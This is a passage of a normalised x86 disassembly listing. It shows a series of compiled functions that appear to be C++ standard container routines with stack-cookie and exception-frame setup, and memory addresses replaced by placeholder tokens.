mov al [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn 0x8
sub_414790
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] ecx
mov eax [ ebp + 0x8 ]
push eax
call sub_402180
add esp 0x4
push eax
call sub_402180
add esp 0x4
push eax
lea ecx [ ebp - 0x1 ]
push ecx
mov ecx [ ebp - 0x8 ]
call sub_401a60
mov ecx eax
call sub_402160
mov edx [ ebp + 0x8 ]
push edx
call sub_414860
add esp 0x4
push eax
call sub_402180
add esp 0x4
push eax
lea eax [ ebp - 0x2 ]
push eax
mov ecx [ ebp - 0x8 ]
call sub_401a60
mov ecx eax
call sub_402160
mov ecx [ ebp + 0x8 ]
push ecx
call sub_4150a0
add esp 0x4
push eax
call sub_402180
add esp 0x4
push eax
lea edx [ ebp - 0x3 ]
push edx
mov ecx [ ebp - 0x8 ]
call sub_401a60
mov ecx eax
call sub_416b80
push 0x1
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx [ ebp - 0x8 ]
call sub_401a60
mov ecx eax
call sub_401d80
mov esp ebp
pop ebp
retn 0x4
sub_414890
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_4150b0
mov esp ebp
pop ebp
retn 0x8
sub_4148b0
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] ecx
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x8 ]
call sub_40cb60
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0x4 ]
push edx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
push ecx
mov ecx [ ebp - 0x8 ]
call sub_415150
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
mov ecx [ edx + 0x8 ]
sub ecx [ eax ]
sar ecx 0x2
push ecx
mov edx [ ebp - 0x8 ]
mov eax [ edx ]
push eax
lea ecx [ ebp - 0x1 ]
push ecx
mov ecx [ ebp - 0x8 ]
call sub_4151c0
mov ecx eax
call sub_4151e0
mov edx [ ebp - 0x8 ]
mov [ edx ] 0x0
mov eax [ ebp - 0x8 ]
mov [ eax + 0x4 ] 0x0
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x8 ] 0x0
sub_414930
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0xc ]
push edx
mov ecx [ ebp + 0x8 ]
call sub_4153c0
mov eax [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn 0x4
sub_414960
push ebp
mov ebp esp
sub esp 0x14
push esi
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp - 0x8 ]
call sub_4134f0
movzx eax al
test eax eax
jne r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x10 ]
lea edx [ edx + ecx - 0x1 ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0xc ]
push eax
mov ecx [ ebp - 0x8 ]
call sub_414d00
mov [ ebp - 0x14 ] eax
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x4 ]
mov eax [ ebp - 0xc ]
xor edx edx
mov esi 0x1
div esi
imul edx edx 0x18
mov eax [ ebp - 0x14 ]
add edx [ ecx + eax * 4 ]
push edx
lea ecx [ ebp - 0x1 ]
push ecx
mov ecx [ ebp - 0x8 ]
call sub_401a60
mov ecx eax
call sub_416b30
mov edx [ ebp - 0x8 ]
mov eax [ edx + 0x10 ]
sub eax 0x1
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
mov [ ecx + 0x10 ] edx
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x0
sub_414a00
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] ecx
lea eax [ ebp - 0x1d ]
push eax
mov ecx [ ebp - 0xc ]
call sub_401a60
push eax
lea ecx [ ebp - 0x5 ]
call sub_401d60
mov ecx [ ebp - 0xc ]
cmp [ ecx + 0x8 ] 0x0
jbe r-xdata
mov [ ebp - 0x24 ] 0x1
mov edx [ ebp - 0xc ]
mov eax [ edx + 0x8 ]
mov [ ebp - 0x24 ] eax
jmp r-xdata
mov ecx [ ebp - 0xc ]
call sub_415200
sub eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x18 ]
jae r-xdata
cmp [ ebp - 0x18 ] 0x8
jae r-xdata
mov ecx [ ebp - 0x24 ]
mov [ ebp - 0x18 ] ecx
mov ecx [ ebp - 0x18 ]
shl ecx 0x1
mov [ ebp - 0x18 ] ecx
jmp r-xdata
mov ecx [ ebp - 0xc ]
call sub_415220
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x18 ]
sub eax [ edx + 0x8 ]
mov [ ebp + 0x8 ] eax
mov ecx [ ebp - 0xc ]
mov edx [ ecx + 0xc ]
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0xc ]
mov ecx [ eax + 0x8 ]
add ecx [ ebp + 0x8 ]
push ecx
lea ecx [ ebp - 0x5 ]
call sub_4152c0
mov [ ebp - 0x1c ] eax
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x1c ]
lea ecx [ eax + edx * 4 ]
mov [ ebp - 0x10 ] ecx
lea edx [ ebp - 0x5 ]
push edx
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ecx + 0x8 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax + 0x4 ]
lea edx [ ecx + edx * 4 ]
push edx
mov eax [ ebp - 0xc ]
mov ecx [ eax + 0x4 ]
mov edx [ ebp - 0x14 ]
lea eax [ ecx + edx * 4 ]
push eax
call sub_416ba0
add esp 0x10
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0x14 ]
cmp ecx [ ebp + 0x8 ]
ja r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x18 ]
sub eax [ edx + 0x8 ]
cmp eax [ ebp + 0x8 ]
jb r-xdata
lea ecx [ ebp - 0x5 ]
push ecx
mov edx [ ebp - 0x10 ]
push edx
mov eax [ ebp - 0xc ]
mov ecx [ eax + 0x4 ]
mov edx [ ebp + 0x8 ]
lea eax [ ecx + edx * 4 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ecx + 0x4 ]
push edx
call sub_416ba0
add esp 0x10
lea eax [ ebp - 0x5 ]
push eax
mov ecx [ ebp - 0x1c ]
push ecx
mov edx [ ebp - 0xc ]
mov eax [ edx + 0x4 ]
mov ecx [ ebp - 0x14 ]
lea edx [ eax + ecx * 4 ]
push edx
mov eax [ ebp - 0xc ]
mov ecx [ eax + 0x4 ]
mov edx [ ebp + 0x8 ]
lea eax [ ecx + edx * 4 ]
push eax
call sub_416ba0
add esp 0x10
mov [ ebp - 0x10 ] eax
lea ecx [ ebp - 0x5 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp - 0x10 ]
push eax
call sub_416be0
add esp 0xc
lea edx [ ebp - 0x5 ]
push edx
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ecx + 0x4 ]
mov eax [ ebp - 0x14 ]
lea ecx [ edx + eax * 4 ]
push ecx
mov edx [ ebp - 0xc ]
mov eax [ edx + 0x4 ]
push eax
call sub_416ba0
add esp 0x10
mov [ ebp - 0x10 ] eax
lea ecx [ ebp - 0x5 ]
push ecx
mov edx [ ebp + 0x8 ]
sub edx [ ebp - 0x14 ]
push edx
mov eax [ ebp - 0x10 ]
push eax
call sub_416be0
add esp 0xc
lea ecx [ ebp - 0x5 ]
push ecx
mov edx [ ebp - 0x14 ]
push edx
mov eax [ ebp - 0x1c ]
push eax
call sub_416be0
add esp 0xc
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x1c ]
mov [ ecx + 0x4 ] edx
mov eax [ ebp - 0xc ]
mov ecx [ eax + 0x8 ]
add ecx [ ebp + 0x8 ]
mov edx [ ebp - 0xc ]
mov [ edx + 0x8 ] ecx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0xc ]
mov ecx [ eax + 0x8 ]
push ecx
mov edx [ ebp - 0xc ]
mov eax [ edx + 0x4 ]
push eax
lea ecx [ ebp - 0x5 ]
call sub_401d80
lea ecx [ ebp - 0x5 ]
push ecx
mov edx [ ebp - 0xc ]
mov eax [ edx + 0x8 ]
mov ecx [ ebp - 0xc ]
mov edx [ ecx + 0x4 ]
lea eax [ edx + eax * 4 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ecx + 0x4 ]
mov eax [ ebp - 0x14 ]
lea ecx [ edx + eax * 4 ]
push ecx
call sub_416c30
add esp 0xc
mov edx [ ebp - 0xc ]
cmp [ edx + 0x4 ] 0x0
je r-xdata
sub_414c20
push ebp
mov ebp esp
push 0xffffffff
push sub_43b1e8
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] ecx
mov ecx [ ebp - 0x10 ]
call sub_4152e0
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp - 0x10 ]
call sub_415260
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x4
sub_414c80
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] ecx
lea ecx [ ebp - 0x5 ]
call sub_401d40
mov ecx [ ebp - 0xc ]
call sub_40cb60
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
push ecx
lea ecx [ ebp - 0x5 ]
call sub_402160
push 0x1
mov edx [ ebp - 0xc ]
mov eax [ edx ]
push eax
lea ecx [ ebp - 0x5 ]
call sub_401d80
mov ecx [ ebp - 0xc ]
mov [ ecx ] 0x0
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn
sub_414d20
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_415320
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x8
sub_414d60
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_415390
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x8
sub_414d80
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x14 ]
push eax
mov ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx ]
mov ecx [ ebp - 0x4 ]
mov eax [ edx + 0x20 ]
call eax
mov esp ebp
pop ebp
retn 0x10
sub_414e10
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp + 0x8 ]
call sub_401890
cmp eax [ ebp + 0xc ]
jae r-xdata
mov ecx [ ebp + 0x8 ]
call sub_401890
sub eax [ ebp + 0xc ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
cmp eax [ ebp + 0x10 ]
jae r-xdata
mov ecx [ ebp - 0x4 ]
call sub_401d20
mov edx [ ebp - 0x4 ]
mov eax [ r--data ]
sub eax [ edx + 0x10 ]
cmp eax [ ebp + 0x10 ]
ja r-xdata
mov ecx [ ebp - 0x8 ]
mov [ ebp + 0x10 ] ecx
cmp [ ebp + 0x10 ] 0x0
jbe r-xdata
mov ecx [ ebp - 0x4 ]
call sub_402040
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0xc
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x10 ]
add edx [ ebp + 0x10 ]
mov [ ebp - 0x8 ] edx
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_401c70
movzx ecx al
test ecx ecx
je r-xdata
mov edx [ ebp + 0x10 ]
push edx
mov ecx [ ebp + 0x8 ]
call sub_401ab0
add eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_401ab0
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x10 ]
push eax
call sub_401070
add esp 0xc
mov edx [ ebp - 0x8 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_401c30
sub_414ed0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ ecx ] edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x20 ]
mov edx [ ebp + 0x8 ]
mov [ ecx ] edx
mov eax [ ebp + 0xc ]
sub eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x30 ]
mov [ edx ] eax
mov esp ebp
pop ebp
retn 0x8
sub_414f10
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
shl eax 0x1
push eax
mov ecx [ ebp - 0x4 ]
add ecx 0x8
call sub_4154c0
mov esp ebp
pop ebp
retn 0x4
sub_414f30
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
lea ecx [ eax + eax + 0x1 ]
push ecx
mov ecx [ ebp - 0x4 ]
add ecx 0x8
call sub_4154c0
mov esp ebp
pop ebp
retn 0x4
sub_414f50
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] ecx
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x1 ]
push ecx
mov ecx [ ebp - 0x8 ]
call sub_414fa0
mov ecx eax
call sub_415430
mov esp ebp
pop ebp
retn 0x4
sub_414f80
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_416c70
add esp 0x8
mov esp ebp
pop ebp
retn 0x8
sub_414fb0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx ]
push edx
mov ecx [ ebp + 0x8 ]
call sub_415320
mov eax [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn 0x4
sub_414fe0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
call sub_414d20
mov eax [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn 0x8
sub_415020
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] ecx
mov eax [ ebp + 0x8 ]
push eax
call sub_402180
add esp 0x4
push eax
call sub_402180
add esp 0x4
push eax
lea ecx [ ebp - 0x1 ]
push ecx
mov ecx [ ebp - 0x8 ]
call sub_401a60
mov ecx eax
call sub_402160
mov edx [ ebp + 0x8 ]
push edx
call sub_414860
add esp 0x4
push eax
call sub_402180
add esp 0x4
push eax
lea eax [ ebp - 0x2 ]
push eax
mov ecx [ ebp - 0x8 ]
call sub_401a60
mov ecx eax
call sub_402160
push 0x1
mov ecx [ ebp + 0x8 ]
push ecx
lea edx [ ebp - 0x3 ]
push edx
mov ecx [ ebp - 0x8 ]
call sub_401a60
mov ecx eax
call sub_401d80
mov esp ebp
pop ebp
retn 0x4
sub_4150b0
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] ecx
push 0x1
lea ecx [ ebp - 0x8 ]
call sub_40e0b0
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
mov [ ebp - 0x8 ] ecx
lea edx [ ebp - 0x28 ]
push edx
mov ecx [ ebp - 0xc ]
call sub_415490
mov eax [ eax ]
mov [ ebp - 0x18 ] eax
lea ecx [ ebp - 0x1c ]
push ecx
mov ecx [ ebp - 0xc ]
call sub_414fb0
mov edx [ eax ]
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x14 ]
push ecx
lea edx [ ebp - 0x20 ]
push edx
mov ecx [ ebp - 0xc ]
call sub_415510
lea eax [ ebp - 0x24 ]
push eax
mov ecx [ ebp - 0xc ]
call sub_414fb0
mov ecx [ eax ]
mov [ ebp - 0x10 ] ecx
lea edx [ ebp - 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x10 ]
push ecx
lea edx [ ebp - 0x2c ]
push edx
mov ecx [ ebp - 0xc ]
call sub_4154e0
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn 0x8
sub_415150
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] ecx
lea eax [ ebp - 0x5 ]
push eax
mov ecx [ ebp - 0xc ]
call sub_4151c0
lea ecx [ ebp - 0x5 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_416ca0
add esp 0xc
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn 0x8
sub_4151e0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_401d80
mov esp ebp
pop ebp
retn 0x8
sub_415200
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] ecx
lea eax [ ebp - 0x1 ]
push eax
mov ecx [ ebp - 0x8 ]
call sub_401a60
mov ecx eax
call sub_415670
mov esp ebp
pop ebp
retn
sub_415260
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] ecx
lea ecx [ ebp - 0x5 ]
call sub_401d40
push 0x1
lea ecx [ ebp - 0x5 ]
call sub_415750
mov ecx [ ebp - 0xc ]
mov [ ecx ] eax
lea ecx [ ebp - 0x14 ]
call sub_40cb70
push eax
mov edx [ ebp - 0xc ]
mov eax [ edx ]
push eax
lea ecx [ ebp - 0x5 ]
call sub_416d20
mov ecx [ ebp - 0xc ]
mov edx [ ecx ]
mov eax [ ebp - 0xc ]
mov [ edx ] eax
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn
sub_4152e0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_40cba0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x4 ] 0x0
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x8 ] 0x0
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc ] 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] 0x0
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_415320
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_4156b0
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x8
sub_415360
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
push ecx
call sub_402180
add esp 0x4
mov edx [ ebp - 0x4 ]
mov eax [ eax ]
mov [ edx ] eax
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_415390
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_4022a0
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov [ ecx ] edx
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x8
sub_4153c0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_4156e0
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x8
sub_4153e0
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_40cc70
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x8 ]
push ecx
mov ecx [ ebp - 0x8 ]
call sub_414d00
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x8 ]
xor edx edx
mov ecx 0x1
div ecx
mov [ ebp - 0xc ] edx
mov edx [ ebp - 0x8 ]
mov eax [ edx + 0x4 ]
mov ecx [ ebp - 0xc ]
imul ecx ecx 0x18
mov edx [ ebp - 0x10 ]
add ecx [ eax + edx * 4 ]
mov eax ecx
mov esp ebp
pop ebp
retn
sub_415430
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp + 0x8 ]
call sub_401890
push eax
mov ecx [ ebp + 0x8 ]
call sub_401870
push eax
call sub_40c9b0
add esp 0x8
mov esp ebp
pop ebp
retn 0x4
sub_415460
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_40cb70
mov ecx [ ebp - 0x4 ]
call sub_4157d0
mov ecx [ ebp - 0x4 ]
mov [ ecx ] eax
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x4
sub_415490
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x4 ]
push edx
mov ecx [ ebp + 0x8 ]
call sub_415320
mov eax [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn 0x4
sub_4154e0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x14 ]
push eax
mov ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_415850
mov eax [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn 0x10
sub_415510
push ebp
mov ebp esp
sub esp 0x1c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x10 ] ecx
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x10 ]
call sub_414fb0
push eax
lea ecx [ ebp + 0xc ]
call sub_415cb0
movzx ecx al
test ecx ecx
je r-xdata
lea ecx [ ebp + 0x10 ]
push ecx
lea ecx [ ebp + 0xc ]
call sub_415cf0
movzx edx al
test edx edx
je r-xdata
lea edx [ ebp - 0x1c ]
push edx
mov ecx [ ebp - 0x10 ]
call sub_415490
push eax
lea ecx [ ebp + 0x10 ]
call sub_415cb0
movzx eax al
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ ebp - 0x10 ]
call sub_4157f0
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn 0xc
push 0x1
lea ecx [ ebp - 0xc ]
call sub_40e0b0
mov eax [ ebp + 0xc ]
push eax
lea ecx [ ebp - 0xc ]
push ecx
mov ecx [ ebp - 0x10 ]
call sub_4157f0
push 0x1
lea ecx [ ebp - 0x8 ]
call sub_40e0b0
mov edx [ ebp + 0x10 ]
push edx
lea eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x10 ]
call sub_4157f0
lea ecx [ ebp - 0x8 ]
push ecx
lea ecx [ ebp - 0xc ]
call sub_415cf0
movzx edx al
test edx edx
je r-xdata
mov ecx [ ebp - 0x10 ]
call sub_415810
jmp r-xdata
mov eax [ ebp - 0xc ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ecx + 0x4 ]
push edx
mov eax [ ebp - 0x8 ]
push eax
call sub_416d50
add esp 0xc
mov [ ebp - 0x14 ] eax
mov ecx [ ebp - 0x10 ]
mov edx [ ecx + 0x4 ]
push edx
mov eax [ ebp - 0x14 ]
push eax
mov ecx [ ebp - 0x10 ]
call sub_415150
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x14 ]
mov [ ecx + 0x4 ] edx
sub_415640
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x0
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x4 ] 0x0
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] 0x0
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_4156b0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
mov edx [ ebp + 0xc ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_4022a0
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x8
sub_4156e0
push ebp
mov ebp esp
push 0xffffffff
push sub_43b218
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] ecx
mov ecx [ ebp - 0x10 ]
call sub_40cb70
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x10 ]
call sub_415c70
mov ecx [ ebp - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ ecx + 0x8 ] edx
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x8
sub_415770
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
lea eax [ ebp + 0xc ]
push eax
lea ecx [ ebp + 0x8 ]
call sub_415fc0
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_4157a0
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
lea eax [ ebp + 0xc ]
push eax
lea ecx [ ebp + 0x8 ]
call sub_415ff0
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_4157f0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
call sub_415320
mov eax [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn 0x8
sub_415810
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_40cb60
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x4 ]
push ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_415150
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ edx ]
mov [ ecx + 0x4 ] eax
mov esp ebp
pop ebp
retn
sub_415850
push ebp
mov ebp esp
push 0xffffffff
push sub_43ba00
mov eax [ fs : 0x0 ]
push eax
push ecx
sub esp 0x34
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x20 ] ecx
mov eax [ ebp - 0x20 ]
mov ecx [ ebp + 0xc ]
sub ecx [ eax ]
sar ecx 0x2
mov [ ebp - 0x40 ] ecx
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x20 ]
call sub_415e50
cmp eax [ ebp + 0x10 ]
jae r-xdata
jmp r-xdata
mov edx [ ebp - 0x20 ]
mov eax [ edx + 0x4 ]
sub eax [ ebp + 0xc ]
sar eax 0x2
cmp eax [ ebp + 0x10 ]
jae r-xdata
mov ecx [ ebp - 0x20 ]
call sub_415e70
mov esi eax
